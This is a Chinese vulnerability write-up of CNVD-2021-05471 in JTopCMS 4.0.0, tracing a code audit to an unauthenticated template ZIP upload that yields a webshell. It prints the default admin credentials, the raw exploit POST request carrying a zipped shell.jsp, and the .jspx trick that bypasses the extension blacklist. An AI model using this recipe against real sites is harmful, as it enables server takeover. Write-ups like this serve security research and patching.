## ****漏洞信息****

CNVD-ID

|

CNVD-2021-05471  
  
---|---  
  
公开日期

|

2021-02-26  
  
危害级别

|

高 ([AV:N/AC:L/Au:N/C:C/I:C/A:C])  
  
影响产品

|

合肥明靖信息科技有限公司 JTopCMS 4.0.0  
  
漏洞描述

|

JTopCMS基于JavaEE标准，是用于管理站点内容的开源网站管理系统(cms, java cms,jsp cms)。
JTopCMS存在文件上传漏洞，攻击者可利用该漏洞获取服务器控制权。  
  
正式解决方案

|

厂商尚未提供漏洞修补方案，请关注厂商主页及时更新：http://www.jtopcms.com/  
  
报送时间

|

2021-01-12  
  
收录时间

|

2021-01-25  
  
##  ** **一、前言****

网上有很多漏洞分析的文章，但却鲜有以漏洞挖掘者的视角，逐步说明漏洞挖掘的过程。 毕竟最终发现的漏洞点是次要的，更重要的是发现漏洞的思路和流程。

“CNVD-2021-05471，jtopcms文件上传getshell” 这个漏洞是我入门JAVA代码审计的一血，本文以“小白”的视角展开。如果你
只是想看具体的漏洞利用，那么请直接跳至“三、漏洞点”。

##  ** **二、漏洞挖掘思路****

###  ** **1.找点****

以前都是PHP，漏洞多，挖的人也多。为了“升个级”，开始学java代码审计，断断续续三周吧。忍不住想试试手，百度搜索相关javacms，发现JTopCMS在第一个，那就是你了。

项目地址：https://gitee.com/mjtop/JTopCMSV3

![](https://image.3001.net/images/20210326/1616738339_605d782343d84a487a711.png!small)

一开始得摆正心态。我其实刚开始审计它的时候，也不是为能够挖到漏洞，只为在这过程中能够更加熟悉java语言。

首先选个常见的漏洞类型，本次选择文件上传漏洞。用IJ idea打开项目，按快捷键ctr+shift+N进行全局文件搜索，搜索“upload”。

![](https://image.3001.net/images/20210326/1616738369_605d7841f2124faf62e7f.png!small)

文件位置：src/cn/com/mjsoft/cms/content/controller/MultipleUploadController.java

###  ** **2.粗看代码****

（是的，就硬看）阅读其中的代码逻辑，发现有疑似漏洞点：

“接收上传文件，在上传完成后才会检查后缀，后缀不符则删除，那么就存在利用临时文件竞争可能性了 ”

##### 大致的逻辑链:

> //1.路由  
> @RequestMapping( value = "/multiUpload.do", method = { RequestMethod.POST,
> RequestMethod.GET } )  
> public Object multiUpload( HttpServletRequest request, HttpServletResponse
> response )
>
>  
> //2.上传文件到放服务器  
> uploadFileToSite()
>
>  
> //3.检查文件类型  
> checkFile()
>
>  
> //4.删除文件  
> deleteErrorFileAndResponse()

### 3.上手干

由于对java的代码不够熟，如果只通过代码来分析是不现实的，因此选择把代码部署起来进行测试。其实不管对代码熟不熟，把代码跑起来进行动态调试，都是很好的辅助方法。

 **项目部署踩坑注意点：**

 ** **1.sql处理****

创建数据时，把sql文件中的0000-00-00 00:00:00都替换成1970-01-01 10:00:00，不然会报错

 ** **2.启动方式****

IJ idea不能用maven部署，要用本地的tomcat local启动，

 ** **3.配置****

WEB-INF/config/conf/cs.properties中 的back_port必须要与tomcat local中配置的启动端口一致！！

 ** **4.启动后访问是tomcat的404解决方法****

参考：https://www.cnblogs.com/xswz/p/7045971.html

![](https://image.3001.net/images/20210326/1616738482_605d78b2959afd2bc7b02.png!small)

 ** **5.部署正常****

访问:http://localhost:8081/是404，也算是 正常部署了

![](https://image.3001.net/images/20210326/1616738546_605d78f2dae067eb3b927.png!small)

访问http://127.0.0.1:8081/就是正常页面

![](https://image.3001.net/images/20210326/1616738564_605d790483eb32fb5fa7e.png!small)

###  **4.抓包**

后台登陆页面

> http://127.0.0.1:8081/login_page
>
> http://127.0.0.1:8081/core/SystemManager/login/page.jsp

默认账号总管理员 admin 密码 jtopcms

进入后台，随便找个图片上传的地方，找一张小图片后台上传，直接抓包。

![](https://image.3001.net/images/20210326/1616738638_605d794ed2eeff9a75bd2.png!small)

![](https://image.3001.net/images/20210326/1616738650_605d795a5f220600292cb.png!small)

上传路径是：http://127.0.0.1:8081/content/multiUpload.do

上传完成后还会返回路径，能够访问

>
> http://localhost:8081/demo/upload/2021-01-07/16099917287704028f02176daf28b2910176dafc2e820028.jpg

 **到这里有个很明显的地方：**

 ** **将Cookie删除后重新上传文件进行测试，发现依然成功****
。说明这里有个越权，无需登录，就能任意上传图片。如果大批量上传图片的话会可以消耗服务器储存空间，不过危害有限。

##### ·尝试上传后缀为.jsp的文件：

发现会删除文件，这里可以通过IJ idea下断点的方式，或者在每个删除语句前添加一条延迟语句（这里还是属于大范围的测试，所以没有精准到某一个分支）。
通过这种方式来查看上传的文件变化

> //代码中的删除语句有  
> targetFile.delete();  
> targetFile.deleteOnExit();  
> deleteErrorFileAndResponse( targetFile );  
> //延迟5秒删除  
> try{  
> Thread.sleep(5000);  
> } catch(InterruptedException e) {  
> e.printStackTrace();  
> }

##### 重新上传，同时进入upload目录查看

![](https://image.3001.net/images/20210326/1616738800_605d79f04eba60b89f26b.png!small)

文件确实上传成功了，不过马上会被检查后缀然后删除， _< u>且不会返回文件名</u>_。

![](https://image.3001.net/images/20210326/1616738837_605d7a15a8ffae0dbb56c.png!small)

网站会修改文件名，且在后缀非法的情况下不会返回文件名，这增加了竞争的利用难度。
****那么下一步就是去看新文件名生成的相关代码，看看是否有“可乘之机”来预测临时文件名。****

###  **5.文件重命名代码**

通过下断点调试的方法找到文件保存那一刻的代码：

    
    
    //该函数保存文件到服务器
    uploadFileToSite()
    //函数被的该条语句实际完成文件保存
    MultipartRequest multi = new MultipartRequest( request, uploadFilePath, maxSize, encodeing,policy );

继续找MultipartRequest，将其选中，右键点击“Find Usages”

![](https://image.3001.net/images/20210326/1616738886_605d7a4666eb5023d7eeb.png!small)

然后在结果中双击到达该类代码文件MultipartRequest.class

![](https://image.3001.net/images/20210326/1616738907_605d7a5b0ae9cc28bc53f.png!small)

MultipartRequest.class

![](https://image.3001.net/images/20210326/1616738936_605d7a7822aee4272c1a1.png!small)

下断点继续跟进到filePart,
阅读代码，发现当policy不为空时会重置上传的文件名。但其实policy在MultipleUploadController.java就被写死了，因此文件名是肯定会被重置。

![](https://image.3001.net/images/20210326/1616738960_605d7a9093405e2420a5d.png!small)

RandomFileRenamePolicy.class

![](https://image.3001.net/images/20210326/1616738978_605d7aa2b274db62324ff.png!small)

那么继续看文件名生成的函数，看看有没有什么规律

> public File rename( File file )  
> {  
> String body = "";  
> String ext = "";  
> int pot = file.getName().lastIndexOf( "." ); //有没有点号，即有没有后缀  
> if( pot != -1 )  
> {  
> body = DateAndTimeUtil.clusterTimeMillis() + "";  
> ext = StringUtil.subString( file.getName(), pot );  
> }  
> else //有后缀的分支  
> {  
> body = DateAndTimeUtil.clusterTimeMillis() + ""; //当前时间戳，精确到毫秒  
> ext = "";  
> }  
>  
> //时间戳+uuid+后缀  
> String newName = body + StringUtil.getUUIDString() + ext;  
>  
> file = new File( file.getParent(), newName );  
> return file;  
> }

好吧.... 到这里感觉希望不大，预测临时文件名这个方向就放弃了

###  **6.继续分析代码**

动静结合，抓完包了，再来看一下代码。最好是能够绕过后缀检查上传jsp，因此细看checkFile函数

![](https://image.3001.net/images/20210326/1616739030_605d7ad608cc57d33420a.png!small)![](https://image.3001.net/images/20210326/1616739045_605d7ae5d8631bb287ca2.png!small)

审计发现当类型是 application/x-zip-compressed
后缀是zip时，会多出一段代码进行检查。disposeZIPImageFile（）会对压缩包进行解压。于是上传压缩包文件测试，修改文件类型，
解压文件出错，需要对应的x-zip-compressed格式才能正确解压。

![](https://image.3001.net/images/20210326/1616739068_605d7afc82e4afd591a9f.png!small)

这个上传点算是无果，但却是马上能联想到经典的 <u>"后台模板压缩包上传getshell"</u>漏洞。

##  ** **三、漏洞点****

那么就在后台找找，果真找到一个模板压缩包上传点。当然了，其实哪怕随便试，也能找到这个点。

![](https://image.3001.net/images/20210326/1616739150_605d7b4e177a2ec78bcfc.png!small)

###  **7.压缩包越权上传**

抓包测试，不校验权限，这样就发现了第二个越权文件上传。

> POST
> /resources/multiUploadSiteFile.do;jsessionid=1?fileCount=1&entry=*template&fileType=.zip&fileSize=798
> HTTP/1.1  
> Accept: text/*  
> Content-Type: multipart/form-data;
> boundary=----------KM7ei4KM7gL6gL6Ef1gL6ae0cH2Ef1  
> User-Agent: Shockwave Flash  
> Host: 127.0.0.1:8081  
> Content-Length: 995  
> Connection: Keep-Alive  
> Cache-Control: no-cache  
> \------------KM7ei4KM7gL6gL6Ef1gL6ae0cH2Ef1  
> Content-Disposition: form-data; name="Filename"  
>  
> 2.zip  
> \------------KM7ei4KM7gL6gL6Ef1gL6ae0cH2Ef1  
> Content-Disposition: form-data; name="Filedata"; filename="2.zip"  
> Content-Type: application/octet-stream  
>  
> PK}NN???c shell.jsp]R]O?0ü+??IkHW??x
> ?TB??"J_?>8?^????N÷?±AQ?fí??±/_é}\ò?ò?????àgT~???)<????22?2zd?????eO????)q?%ê?K?jf??}$?óW'bòMLìi?-M$è?ó?CCv?lp,??<=%  
> ??;?wY????&c??^?=.ó????A/m??  
>
> !?3R???\\`H]$??B?B??E?iR?%^=zL]fE??<v}\k·-?.gP???!J[ì?o.j??ê*KYC*K??????è_/qVf?'?RQ?>?.ú?Vr;§$?àzYo???U[i?hB???Aáê????|Cj?Oh6ò?}??*%??ü"?5?f?·?f?4?Z6??
> ê??PK`'R??x 1234.png??s???b``à??p ??
> ??$?4??R?A?N????rX?}6?s?Idò9<"?TA?3H?PP???1D"<y?w?ó?f,0P(`~??(ú%P
> §??:§&PK}NN???c $ shell.jsp  
> ?9??@?&_§è?@?&_§è?PK`'R??x $ ?1234.png  
> ??????!±>§è?-?°>§è?PK?R  
> \------------KM7ei4KM7gL6gL6Ef1gL6ae0cH2Ef1  
> Content-Disposition: form-data; name="Upload"  
> Submit Query  
> \------------KM7ei4KM7gL6gL6Ef1gL6ae0cH2Ef1--
而且上传后会解压文件到template目录下（本地测试可能会解压到demo/template目录下）。

上传路由/resources/multiUploadSiteFile.do  
对应文件：  
JTopCMSV3\src\cn\com\mjsoft\cms\resources\controller\ManageSiteFileAndCheckController.java

相关代码：

> while ( fiIter.hasNext() )  
> {  
> fileEntry = ( Entry ) fiIter.next();  
> fn = ( String ) fileEntry.getKey();  
>  
> if( fn.toLowerCase().endsWith( ".jsp" ) || fn.toLowerCase().endsWith(
> ".thtml" ) ) //第一次检测  
> {  
> File targetFile = new File( ( String ) fileEntry.getValue() )  
>  
> if( !checkTemplate( new File( ( String ) fileEntry.getValue() ) ) )
> //checkTemplate函数中又做了一遍检查  
> {  
>  
> log.info( "下列非法文件将被删除:" + fn );  
> targetFile.delete();  
> if( targetFile.exists() )  
> {  
> targetFile.deleteOnExit();  
> }  
> continue;  
> }  
> }  
> ....  
> }

在代码中以及checkTemplate（）函数中都对后缀做了检查，但是是黑名单过滤，只限制了jsp和thtml。我们可以使用jspx作为后缀进行绕过。因此可以将小马shell.jspx打包成ZIP上传，然后在template目录下访问即可。

###  **8.后续深入理解**

漏洞点是很简单的，但随着后面代码审计以及java学习的深入，会发现网站的代码其实是做足了安全措施的。

因为通过这个文件上传漏洞，我们很快就会想到去尝试检测后台的“文件下载”、“文件删除”等功能点是否存在漏洞，但无一例外，都会返回提示“你无权限进行该操作”，或者错误跳转到登录页面。但查看代码时却又发现有些功能点对应的代码中明明没有对权限做校验，操作时仍然会被拦截了。

这是因为它配置了拦截器和过滤器对所有的请求进行拦截和权限校验。

#####  **拦截器**

在./WEB-INF/config/spring-config.xml中配置生效

> <mvc:interceptor>  
> <!-- 拦截所有的请求-->  
> <mvc:mapping path="/**" />  
> <bean class="com.xxx.HandlerInterceptorAdapter" />  
> </mvc:interceptor>

各种拦截器过滤器都会对请求做校验，用xxx数据库来区分路由是否允许能够被公开访问。

#####  **过滤器**

在 ./WEB-INF/web.xml 中配置生效

> <filter>  
> <filter-name>interceptFilter</filter-name>  
> <filter-class>cn.com.mjsoft.framework.web.engine.InterceptFilter</filter-> class>  
> </filter>  
> <filter-mapping>  
> <filter-name>interceptFilter</filter-name>  
> <url-pattern>/*</url-pattern>  
> </filter-mapping>

理论上同时拥有拦截器和过滤器进行保护是无法做到越权上传的，但是利用IJ
idea进行调试发现/resources/multiUploadSiteFile.do被判断为不受保护的公开资源。

![](https://image.3001.net/images/20210326/1616739302_605d7be646bf2af5a80f2.png!small)

跟踪关键字isProtectResource来到SecurityService.java

> if( resInfoMap == null )  
> {  
> resInfoMap = securityDao.queryAllSecurityResourceBeanMap();  
>  
> resMapCache.putEntry( allResMapkey, resInfoMap );  
> }
>
> 追踪queryAllSecurityResourceBeanMap，来到ChannelDao.java
>
> public Map queryAllSecurityResourceBeanMap()  
> {  
> String sql = "select sr.secResId, sr.target, sr.dataProtectType,
> sdt.accSymbol, sdt.dataTypeId, sdt.accBehaviorClass from securityresource sr
> left join security_data_type sdt on sr.dataSecTypeId=sdt.dataTypeId";  
> Map result = new HashMap();  
> pe.query( sql, new SecurityResourceBeanMapTransform( result ) );  
> return result;  
> }

可以知道是从数据表securityresource中获得的信息来片段是否是受保护的路由。 **
**在securityresource表中中的就是受保护的，没有的就是公开资源。而之前发现的文件上传漏洞的路由multiUploadSiteFile.do恰好漏掉了****
。 从而导致绕过检验，可以越权上传文件。

![](https://image.3001.net/images/20210326/1616739335_605d7c0792749c6e51474.png!small)

##  ** **四、总结****

整篇文章下来，我们可以发现，如果不是去找涉及java自身特性的漏洞，而是找常见的web漏洞，PHP和Java语言没有本质区别。只不过是需要多熟悉一下Java的代码语法和使用罢了。如果原本有代码审计基础或者熟悉常见web漏洞，那么入门起来会轻松很多。

 **本文作者：光通天下无患实验室 BlusKing**

